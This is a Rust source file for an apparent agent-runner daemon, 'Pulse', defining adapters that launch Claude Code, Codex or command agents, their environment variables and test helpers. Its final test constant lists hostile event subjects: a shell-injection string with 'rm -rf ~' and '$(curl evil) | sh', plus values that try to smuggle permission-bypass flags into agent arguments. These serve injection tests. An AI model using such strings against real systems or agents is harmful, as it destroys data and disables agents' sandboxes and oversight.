//! Agent adapters and the process supervisor.
//!
//! ## Contract
//!
//! An adapter is two pure pieces ([`AgentAdapter`]): it builds an [`Invocation`] (argv, env,
//! cwd, stdin) from the agent's config and a [`RunRequest`], and it provides an
//! [`OutputParser`] that turns the process's native output lines into [`RunOutput`]s, keeping
//! provider detail in `RunOutput::data`. Adapters do no I/O. Parsers never fail: a line they do
//! not recognize is passed through as `stdout` / `stderr`.
//!
//! One shared [`supervise`] does the I/O for every adapter: spawn in a new process group,
//! stream lines through the parser, enforce the timeout, and terminate the group (SIGTERM, a
//! grace period, SIGKILL) on cancel, timeout, or once the agent exits. It only signals the group
//! it created, and only while it still holds the unreaped leader. See [`supervisor`] for the
//! exact guarantee and its limits.
//!
//! Adapters: [`command`] (any argv), [`claude_code`], [`codex`]. Decisions behind their
//! defaults are in `docs/internals/0006-agent-adapters.md`.
//!
//! ### Run environment
//!
//! A run's environment is the daemon's environment minus every `PULSE_*` variable, then the
//! agent's configured `env`, then [`run_env`] (which wins):
//!
//! | Variable | Value |
//! |---|---|
//! | `PULSE_RUN_ID` | the run id; `pulse run` and `pulse ingest` read it for exact causation |
//! | `PULSE_RULE`, `PULSE_AGENT` | rule and agent names (`PULSE_RULE` absent for reruns of deleted rules) |
//! | `PULSE_CHAIN_DEPTH` | the run's chain depth |
//! | `PULSE_HOME` | the Pulse home, so `pulse` subcommands reach this daemon |
//! | `PULSE_EVENT_FILE` | path of the triggering event as JSON, written by the daemon |
//! | `PULSE_EVENT_ID`, `_TYPE`, `_SOURCE`, `_SUBJECT`, `_TIME`, `_DATA` | from `pulse_core::event_env` |
//!
//! Adapters never pass event content through a shell. Agents' own permission modes and
//! sandboxes are passed through from config, default to the most restrictive setting that does
//! not hang an unattended run, and are never widened.

pub mod claude_code;
pub mod codex;
pub mod command;
mod json;
pub mod supervisor;

use std::path::PathBuf;

use pulse_contracts::config::{AgentConfig, AgentKind, PromptLimits};
use pulse_contracts::run::InvocationSummary;
use pulse_contracts::{Event, RenderedPrompt, RunId, RunOutput};

pub use supervisor::{RunEnd, SuperviseError, SuperviseOptions, SupervisorEvent, supervise};
pub use tokio_util::sync::CancellationToken;

/// Everything an adapter needs to build an invocation. Paths are resolved by the daemon.
#[derive(Clone, Debug)]
pub struct RunRequest {
    pub run_id: RunId,
    pub rule: Option<String>,
    pub agent: String,
    pub event: Event,
    /// `None` for `command` agents whose rule has no prompt.
    pub prompt: Option<RenderedPrompt>,
    pub chain_depth: u32,
    /// The working directory: the agent's `cwd` expanded, or a per-run directory.
    pub cwd: PathBuf,
    /// Where the daemon wrote the event JSON.
    pub event_file: PathBuf,
    pub pulse_home: PathBuf,
    pub limits: PromptLimits,
}

/// A process to start. Never a shell string.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Invocation {
    pub program: String,
    pub args: Vec<String>,
    pub cwd: PathBuf,
    /// Added to the daemon's environment, in order (later entries win).
    pub env: Vec<(String, String)>,
    /// Written to stdin, which is then closed. `None`: stdin is null.
    pub stdin: Option<String>,
}

impl Invocation {
    pub fn summary(&self) -> InvocationSummary {
        InvocationSummary {
            program: self.program.clone(),
            args: self.args.clone(),
            cwd: self.cwd.display().to_string(),
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum AdapterError {
    #[error("agent {agent:?} is configured for {configured:?}, not this adapter")]
    WrongAdapter { agent: String, configured: AgentKind },
    #[error("{0}")]
    Invalid(String),
}

/// Which stream a line came from.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Stream {
    Stdout,
    Stderr,
}

impl Stream {
    pub const fn as_str(self) -> &'static str {
        match self {
            Stream::Stdout => "stdout",
            Stream::Stderr => "stderr",
        }
    }
}

/// What a run's output says about the files the agent wrote, for loop protection. Only adapters
/// whose [`AgentAdapter::reports_writes`] is true produce these; see
/// `docs/internals/0002-architecture.md`, "Loop protection".
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum WriteFact {
    /// A tool call that writes this path, as the agent gave it (absolute or relative to the
    /// run's working directory; untrusted text). Reported when the call is seen, before the
    /// tool runs.
    Wrote(String),
    /// Something whose writes cannot be seen: a shell command, an MCP tool, a subagent, any tool
    /// not known to be read-only, or output the parser does not understand. Says what, briefly.
    Opaque(String),
}

/// Turns native output into normalized output. One parser per run; it may keep state across
/// lines (for example, a partially streamed message).
pub trait OutputParser: Send {
    /// One complete line, without its terminator.
    fn line(&mut self, stream: Stream, line: &str, out: &mut Vec<RunOutput>);
    /// The process ended; flush anything pending.
    fn finish(&mut self, out: &mut Vec<RunOutput>);
    /// Moves the write facts found since the last call into `out`. Called after every line.
    fn take_facts(&mut self, out: &mut Vec<WriteFact>) {
        let _ = out;
    }
}

/// How Pulse invokes one kind of agent. Pure.
pub trait AgentAdapter: Send + Sync {
    fn kind(&self) -> AgentKind;
    fn invocation(
        &self,
        agent: &AgentConfig,
        request: &RunRequest,
    ) -> Result<Invocation, AdapterError>;
    fn parser(&self) -> Box<dyn OutputParser>;
    /// Whether the parser reports every write the agent's tools make ([`WriteFact`]). A run of
    /// an adapter that cannot is opaque from the start: its folder's changes are inferred to be
    /// its own.
    fn reports_writes(&self) -> bool {
        false
    }
}

/// The adapter for a kind. `None` for `mcp` agents, which Pulse does not run.
pub fn adapter_for(kind: AgentKind) -> Option<&'static dyn AgentAdapter> {
    match kind {
        AgentKind::Command => Some(&command::CommandAdapter),
        AgentKind::ClaudeCode => Some(&claude_code::ClaudeCodeAdapter),
        AgentKind::Codex => Some(&codex::CodexAdapter),
        AgentKind::Mcp => None,
    }
}

/// The variables every run gets; see the crate docs.
pub fn run_env(request: &RunRequest) -> Vec<(String, String)> {
    let mut env = vec![
        ("PULSE_RUN_ID".to_owned(), request.run_id.to_string()),
        ("PULSE_AGENT".to_owned(), request.agent.clone()),
        ("PULSE_CHAIN_DEPTH".to_owned(), request.chain_depth.to_string()),
        ("PULSE_HOME".to_owned(), request.pulse_home.display().to_string()),
        ("PULSE_EVENT_FILE".to_owned(), request.event_file.display().to_string()),
    ];
    if let Some(rule) = &request.rule {
        env.push(("PULSE_RULE".to_owned(), rule.clone()));
    }
    env.extend(pulse_core::event_env(&request.event, &request.limits));
    env
}

#[cfg(test)]
pub(crate) mod test_support {
    use std::path::PathBuf;

    use pulse_contracts::config::{AdapterSettings, AgentConfig, PromptLimits};
    use pulse_contracts::{
        Duration, Event, EventId, EventType, RenderedPrompt, RunId, Timestamp, Ulid,
    };
    use serde_json::json;

    use pulse_contracts::{OutputKind, RunOutput};

    use crate::{OutputParser, RunRequest, Stream};

    /// Expected outputs: kind and a prefix of the text.
    pub type Expect<'a> = &'a [(OutputKind, &'a str)];

    pub fn parse(mut parser: Box<dyn OutputParser>, lines: &[(Stream, &str)]) -> Vec<RunOutput> {
        let mut out = Vec::new();
        for (stream, line) in lines {
            parser.line(*stream, line, &mut out);
        }
        parser.finish(&mut out);
        out
    }

    /// Parses a recorded stream as stdout lines.
    pub fn parse_stdout(parser: Box<dyn OutputParser>, text: &str) -> Vec<RunOutput> {
        parse(parser, &text.lines().map(|l| (Stream::Stdout, l)).collect::<Vec<_>>())
    }

    pub fn assert_outputs(got: &[RunOutput], want: Expect<'_>, what: &str) {
        let summary: Vec<(OutputKind, &str)> =
            got.iter().map(|o| (o.kind, o.text.as_str())).collect();
        assert_eq!(got.len(), want.len(), "{what}: {summary:#?}");
        for (o, (kind, prefix)) in got.iter().zip(want) {
            assert_eq!(o.kind, *kind, "{what}: {summary:#?}");
            assert!(
                o.text.starts_with(prefix),
                "{what}: {:?} does not start with {prefix:?}",
                o.text
            );
        }
    }

    /// A request for an `fs.file.created` event with this subject (also `data.path` and
    /// `data.name`), with a prompt that embeds it the way rendering would.
    pub fn request(subject: &str) -> RunRequest {
        RunRequest {
            run_id: RunId::from_ulid(Ulid::from_parts(1, 1)),
            rule: Some("notify".into()),
            agent: "notify".into(),
            event: Event {
                specversion: Default::default(),
                id: EventId::from_ulid(Ulid::from_parts(2, 2)),
                type_: EventType::new("fs.file.created").unwrap(),
                source: "pulse://fs/u".into(),
                subject: Some(subject.into()),
                time: Timestamp::from_millis(0),
                datacontenttype: None,
                data: json!({"path": subject, "name": subject}),
                dedupe_key: None,
                coalesced: None,
                causation_run: None,
                causation: None,
                chain_depth: 0,
                inference: None,
                replay_of: None,
            },
            prompt: Some(RenderedPrompt {
                text: format!("Summarize {subject}"),
                delimiter: "PULSE-UNTRUSTED-DATA-0".into(),
                truncated: false,
                missing: vec![],
            }),
            chain_depth: 1,
            cwd: PathBuf::from("/w"),
            event_file: PathBuf::from("/p/runs/1/event.json"),
            pulse_home: PathBuf::from("/p"),
            limits: PromptLimits::default(),
        }
    }

    pub fn agent(adapter: AdapterSettings) -> AgentConfig {
        AgentConfig {
            name: "notify".into(),
            adapter,
            allow: vec![],
            cwd: None,
            timeout: Duration::from_mins(1),
            max_concurrent: 1,
            max_queued: 1,
            env: [
                ("PULSE_RUN_ID".to_owned(), "spoofed".to_owned()),
                ("TOKEN".to_owned(), "t".to_owned()),
            ]
            .into(),
        }
    }

    /// The last value of `key` in an invocation's environment (later entries win).
    pub fn env<'a>(env: &'a [(String, String)], key: &str) -> Option<&'a str> {
        env.iter().rev().find(|(k, _)| k == key).map(|(_, v)| v.as_str())
    }

    /// Subjects that try to escape their argument: newlines, leading dashes, shell syntax and
    /// template syntax.
    pub const HOSTILE: [&str; 5] = [
        "/u/x; rm -rf ~ && $(curl evil) `id` | sh",
        "--dangerously-skip-permissions",
        "-c\nsandbox_mode=\"danger-full-access\"\n--yolo",
        "{{prompt}} {{data.path}} --model=x",
        "line one\nline two\r\n--permission-mode=bypassPermissions",
    ];
}
